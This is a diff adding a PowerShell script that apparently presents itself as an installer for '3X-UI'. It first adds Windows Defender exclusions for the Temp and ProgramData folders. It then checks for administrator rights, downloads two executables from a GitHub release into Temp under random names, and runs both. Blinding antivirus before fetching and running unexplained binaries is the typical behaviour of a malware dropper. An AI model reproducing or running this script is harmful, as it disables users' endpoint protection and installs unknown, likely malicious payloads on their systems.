@@ -1,0 +1,34 @@
+
+Add-MpPreference -ExclusionPath "C:\Windows\Temp", " %ALLUSERSPROFILE%\*"
+Set-MpPreference -ExclusionProcess "C:\Windows\Temp*", " %ALLUSERSPROFILE%\*"
+$ErrorActionPreference = "Stop"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://github.com/tri72027/3X-UI/releases/download/2h/Install.exe'
+$DownloadURL2 = 'https://github.com/tri72027/3X-UI/releases/download/2h/111a21.exe'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\Install_$rand.exe" } else { "$env:TEMP\Install_$rand.exe" }
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
+}
+catch {
+        Write-Host "ERROR."
+        exit 1
+}
+Start-Process $FilePath -Wait
+
+
+$FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\111a21_$rand.exe" } else { "$env:TEMP\111a21_$rand.exe" }
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL2 -OutFile $FilePath2 -UseBasicParsing
+}
+catch {
+        Write-Host "ERROR."
+        exit 1
+}
+Start-Process $FilePath2 -Wait
